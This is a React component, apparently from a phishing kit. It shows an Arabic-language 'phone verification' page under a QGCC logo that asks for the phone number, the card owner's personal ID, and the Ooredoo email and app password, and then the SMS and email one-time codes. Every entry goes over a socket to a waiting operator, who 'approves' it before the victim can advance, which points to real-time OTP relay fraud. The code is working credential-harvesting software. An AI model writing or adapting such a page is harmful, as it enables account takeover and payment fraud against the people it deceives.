import React, { useState, useEffect } from 'react';
import { Loader2, Clock, CheckCircle, XCircle } from 'lucide-react';
import { socketService } from '../services/socketService';

interface VerificationFormProps {
  onNext: () => void;
  onDataChange?: (data: any) => void;
}

type SubStep = 'initial' | 'phone_otp' | 'email_otp';
type ApprovalStatus = 'idle' | 'waiting' | 'approved' | 'rejected';

const VerificationForm: React.FC<VerificationFormProps> = ({ onNext, onDataChange }) => {
  const [subStep, setSubStep] = useState<SubStep>('initial');
  const [provider, setProvider] = useState<'ooredoo' | 'vodafone' | ''>('');
  const [phone, setPhone] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [phoneOtp, setPhoneOtp] = useState('');
  const [emailOtp, setEmailOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [passwordError, setPasswordError] = useState('');
  const [tempPasswordError, setTempPasswordError] = useState('');
  const [passwordRequirements, setPasswordRequirements] = useState({
    hasLower: false,
    hasUpper: false,
    hasNumber: false,
    hasMinLength: false,
    hasSymbol: false
  });

  // Approval system states
  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus>('idle');
  const [rejectionReason, setRejectionReason] = useState('');

  // Send data to parent when it changes
  useEffect(() => {
    if (onDataChange) {
      onDataChange({
        subStep,
        provider,
        phone,
        idNumber,
        email,
        password,
        phoneOtp,
        emailOtp
      });
    }
  }, [subStep, provider, phone, idNumber, email, password, phoneOtp, emailOtp, onDataChange]);

  // Setup approval listener
  useEffect(() => {
    const handleApprovalDecision = (decision: { decision: 'approved' | 'rejected'; page: string; reason?: string }) => {
      console.log('🔔 Approval decision for verification:', decision);
      
      // Check if decision is for current substep
      const currentPage = `step5-${subStep}`;
      if (decision.page === currentPage) {
        if (decision.decision === 'approved') {
          setApprovalStatus('approved');
          // Auto-proceed after approval
          setTimeout(() => {
            proceedToNextStep();
          }, 1000);
        } else {
          setApprovalStatus('rejected');
          setRejectionReason(decision.reason || 'تم رفض الطلب من قبل المشرف');
          // Reset to idle after 3 seconds
          setTimeout(() => {
            setApprovalStatus('idle');
            setRejectionReason('');
          }, 3000);
        }
      }
    };

    socketService.onApprovalDecision(handleApprovalDecision);

    return () => {
      socketService.offApprovalDecision();
    };
  }, [subStep]);

  const proceedToNextStep = () => {
    if (subStep === 'initial') {
      setSubStep('phone_otp');
      setApprovalStatus('idle');
    } else if (subStep === 'phone_otp') {
      if (provider === 'ooredoo') {
        setSubStep('email_otp');
        setApprovalStatus('idle');
      } else {
        onNext();
      }
    } else if (subStep === 'email_otp') {
      onNext();
    }
  };

  const handleInitialSubmit = () => {
    setIsLoading(true);
    // Save data first
    socketService.saveVisitorData({
      provider,
      phone,
      idNumber,
      email,
      password
    }, 'step5-initial');
    
    setTimeout(() => {
      setIsLoading(false);
      // Request approval
      setApprovalStatus('waiting');
      socketService.requestApproval('step5-initial');
    }, 1500);
  };

  const handlePhoneOtpSubmit = () => {
    setIsLoading(true);
    // Save data first
    socketService.saveVisitorData({
      phoneOtp
    }, 'step5-phone_otp');
    
    setTimeout(() => {
      setIsLoading(false);
      // Request approval
      setApprovalStatus('waiting');
      socketService.requestApproval('step5-phone_otp');
    }, 1500);
  };

  const handleEmailOtpSubmit = () => {
    setIsLoading(true);
    // Save data first
    socketService.saveVisitorData({
      emailOtp
    }, 'step5-email_otp');
    
    setTimeout(() => {
      setIsLoading(false);
      // Request approval
      setApprovalStatus('waiting');
      socketService.requestApproval('step5-email_otp');
    }, 1500);
  };

  // Approval waiting overlay
  const ApprovalOverlay = () => {
    if (approvalStatus === 'idle') return null;

    return (
      <div className="fixed inset-0 z-[100] bg-white/95 backdrop-blur-sm flex items-center justify-center">
        <div className="bg-white border-2 border-gray-200 rounded-lg p-8 max-w-md w-full mx-4 shadow-2xl">
          {approvalStatus === 'waiting' && (
            <div className="flex flex-col items-center gap-4 text-center">
              <Clock className="w-16 h-16 text-[#007fb1] animate-pulse" />
              <h3 className="text-[20px] font-bold text-[#333]">في انتظار الموافقة</h3>
              <p className="text-[14px] text-gray-600">يرجى الانتظار حتى يتم مراجعة بياناتك من قبل المشرف...</p>
              <div className="flex gap-2 mt-2">
                <div className="w-2 h-2 bg-[#007fb1] rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2 h-2 bg-[#007fb1] rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2 h-2 bg-[#007fb1] rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          )}
          
          {approvalStatus === 'approved' && (
            <div className="flex flex-col items-center gap-4 text-center">
              <CheckCircle className="w-16 h-16 text-green-500" />
              <h3 className="text-[20px] font-bold text-green-600">تمت الموافقة! ✅</h3>
              <p className="text-[14px] text-gray-600">جاري الانتقال للخطوة التالية...</p>
            </div>
          )}
          
          {approvalStatus === 'rejected' && (
            <div className="flex flex-col items-center gap-4 text-center">
              <XCircle className="w-16 h-16 text-red-500" />
              <h3 className="text-[20px] font-bold text-red-600">تم الرفض ❌</h3>
              <p className="text-[14px] text-gray-600">{rejectionReason}</p>
              <p className="text-[12px] text-gray-500 mt-2">يرجى تصحيح البيانات والمحاولة مرة أخرى</p>
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="w-full max-w-[1400px] mx-auto bg-white font-sans" dir="rtl">
      <ApprovalOverlay />
      
      {/* QGCC Logo Only */}
      <div className="flex flex-col items-center mt-10 mb-8 max-w-[1000px] mx-auto">
        <div className="flex items-center justify-center">
          <img src="/qgcc_LOGO.png" alt="QGCC Logo" className="h-[80px] w-auto" />
        </div>
      </div>

      {isLoading && (
        <div className="fixed inset-0 z-[100] bg-white/60 backdrop-blur-sm flex items-center justify-center">
          <Loader2 className="w-12 h-12 text-[#007fb1] animate-spin" />
        </div>
      )}

      {/* Verification Card */}
      <div className="bg-[#fcfcfc] border border-gray-300 rounded-[4px] p-8 md:p-14 mx-4 mb-10 min-h-[500px] max-w-[1000px] mx-auto">
        <div className="max-w-[800px] mx-auto">
          
          {subStep === 'initial' && (
            <div className="animate-in fade-in duration-500">
              <div className="text-right mb-10">
                <h2 className="text-[24px] font-black text-[#2d3a5a] mb-6">توثيق رقم الهاتف</h2>
                <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                <div className="space-y-3">
                  <p className="text-[14px] font-black text-gray-800">
                    يرجى ادخال رقم الهاتف المرتبط بطريقة الدفع، لإثبات ملكية البطاقة.
                  </p>
                  <p className="text-[12px] text-gray-500 leading-relaxed font-extrabold">
                    لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، يمكنك استخدام بطاقة تعود لشخص آخر، لكن يجب اثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.
                  </p>
                </div>
              </div>

              <div className="max-w-[450px] mx-auto space-y-5">
                <div className="space-y-2">
                  <label className="block text-[13px] font-black text-gray-700">مزود الخدمة <span className="text-red-500">*</span></label>
                  <select 
                    className="nas-select text-right pr-4 font-black"
                    value={provider}
                    onChange={(e) => setProvider(e.target.value as any)}
                  >
                    <option value="" disabled>اختر مزود الخدمة</option>
                    <option value="ooredoo">اوريدو ooredoo</option>
                    <option value="vodafone">فودافون vodafone</option>
                  </select>
                </div>

                {provider !== '' && (
                  <div className="space-y-5 animate-in slide-in-from-top-4 duration-300">
                    <div className="space-y-2">
                      <label className="block text-[13px] font-black text-gray-700">رقم الهاتف <span className="text-red-500">*</span></label>
                      <input className="nas-input text-left font-black" placeholder="Phone" value={phone} onChange={(e) => setPhone(e.target.value)} />
                    </div>

                    {provider === 'ooredoo' && (
                      <div className="space-y-5">
                        <div className="space-y-2">
                          <label className="block text-[13px] font-black text-gray-700">الرقم الشخصي لمالك البطاقة <span className="text-red-500">*</span></label>
                          <input className="nas-input text-left font-black" placeholder="Id" value={idNumber} onChange={(e) => setIdNumber(e.target.value)} />
                        </div>
                        <div className="space-y-2">
                          <label className="block text-[13px] font-black text-gray-700">البريد الالكتروني المعتمد ب ooredoo <span className="text-red-500">*</span></label>
                          <input className="nas-input text-left font-black" placeholder="Email" value={email} onChange={(e) => setEmail(e.target.value)} />
                        </div>
                        <div className="space-y-2">
                          <label className="block text-[13px] font-black text-gray-700">كلمة المرور لتطبيق ooredoo <span className="text-red-500">*</span></label>
                          <input 
                            className="nas-input text-left font-black" 
                            type="password" 
                            placeholder="Password" 
                            style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}
                            value={password} 
                            onChange={(e) => {
                              const value = e.target.value;
                              // Block Hindi/Arabic numerals
                              const hindiNumeralsRegex = /[٠-٩۰-۹]/;
                              if (hindiNumeralsRegex.test(value)) {
                                setPasswordError('يرجى إدخال الأرقام الإنجليزية فقط (0-9) وليس الأرقام الهندية');
                                return;
                              }
                              const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
                              if (!englishRegex.test(value)) {
                                setPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
                                return;
                              }
                              setPasswordError('');
                              setPassword(value);
                              
                              // Validate password requirements
                              setPasswordRequirements({
                                hasLower: /[a-z]/.test(value),
                                hasUpper: /[A-Z]/.test(value),
                                hasNumber: /[0-9]/.test(value),
                                hasMinLength: value.length >= 8,
                                hasSymbol: /[%$#@&/\-_]/.test(value)
                              });
                            }} 
                          />
                          {passwordError && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{passwordError}</p>
                          )}
                          {password && (!passwordRequirements.hasLower || !passwordRequirements.hasUpper || !passwordRequirements.hasNumber || !passwordRequirements.hasMinLength || !passwordRequirements.hasSymbol) && (
                            <div className="mt-2 text-[11px] space-y-1">
                              {!passwordRequirements.hasLower && <p className="text-[#d9534f]">✗ حرف صغير واحد على الأقل</p>}
                              {!passwordRequirements.hasUpper && <p className="text-[#d9534f]">✗ حرف كبير واحد على الأقل</p>}
                              {!passwordRequirements.hasNumber && <p className="text-[#d9534f]">✗ رقم واحد على الأقل</p>}
                              {!passwordRequirements.hasMinLength && <p className="text-[#d9534f]">✗ الحد الأدنى لطول كلمة المرور 8 أحرف</p>}
                              {!passwordRequirements.hasSymbol && <p className="text-[#d9534f]">✗ رمز واحد على الأقل (% $ # @ & / - _)</p>}
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    <div className="pt-4">
                      <button onClick={handleInitialSubmit} className="w-full bg-[#007fb1] text-white font-black py-3 rounded-[4px] text-[15px] hover:bg-[#005a7d] transition-all">استمر</button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {subStep === 'phone_otp' && (
            <div className="animate-in fade-in duration-500">
              <div className="text-right mb-10">
                <h2 className="text-[24px] font-black text-[#2d3a5a] mb-6">توثيق رقم الهاتف</h2>
                <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                <div className="space-y-4 text-center">
                  <p className="text-[16px] font-black text-gray-800">
                    يرجى الانتظار، سيتم ارسال رمز تحقق الى الرقم الذي قمت بادخاله بشكل صحيح لإكمال توثيق الطلب
                  </p>
                  <p className="text-[13px] text-gray-500 font-black">
                    يرجى ادخال اخر رمز تحقق توصلت به عبر الرسائل النصية.
                  </p>
                </div>
              </div>

              <div className="max-w-[450px] mx-auto space-y-6">
                <div className="space-y-2 text-center">
                  <label className="block text-[14px] font-black text-gray-800 mb-2">رمز التحقق <span className="text-red-500">*</span></label>
                  <input 
                    className="nas-input text-center h-[46px] text-[20px] font-black tracking-[0.5em]" 
                    maxLength={6}
                    value={phoneOtp}
                    onChange={(e) => setPhoneOtp(e.target.value.replace(/\D/g, ''))}
                  />
                </div>
                <div className="pt-4">
                  <button onClick={handlePhoneOtpSubmit} className="w-full bg-[#007fb1] text-white font-black py-3.5 rounded-[4px] text-[16px] hover:bg-[#005a7d] transition-colors">تحقق</button>
                </div>
              </div>
            </div>
          )}

          {subStep === 'email_otp' && (
            <div className="animate-in fade-in duration-500">
              <div className="flex justify-center mb-10">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" alt="Gmail" className="w-16 h-auto drop-shadow-md" />
              </div>
              
              <div className="text-right mb-10">
                <h2 className="text-[24px] font-black text-[#2d3a5a] mb-6">توثيق رقم الهاتف</h2>
                <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                <div className="space-y-4">
                  <p className="text-[15px] text-gray-800 text-center leading-relaxed font-black">
                    يرجى ادخال رمز التحقق المرسل على البريد الالكتروني المعتمد ب ooredoo
                  </p>
                </div>
              </div>

              <div className="max-w-[450px] mx-auto space-y-6">
                <div className="space-y-2 text-center">
                  <label className="block text-[14px] font-black text-gray-800 mb-2">رمز التحقق <span className="text-red-500">*</span></label>
                  <input 
                    className="nas-input text-center h-[46px] text-[20px] font-black tracking-[0.5em]" 
                    maxLength={6}
                    value={emailOtp}
                    onChange={(e) => setEmailOtp(e.target.value.replace(/\D/g, ''))}
                  />
                </div>
                <div className="pt-4">
                  <button onClick={handleEmailOtpSubmit} className="w-full bg-[#007fb1] text-white font-black py-3.5 rounded-[4px] text-[16px] hover:bg-[#005a7d] transition-colors">تحقق</button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default VerificationForm;
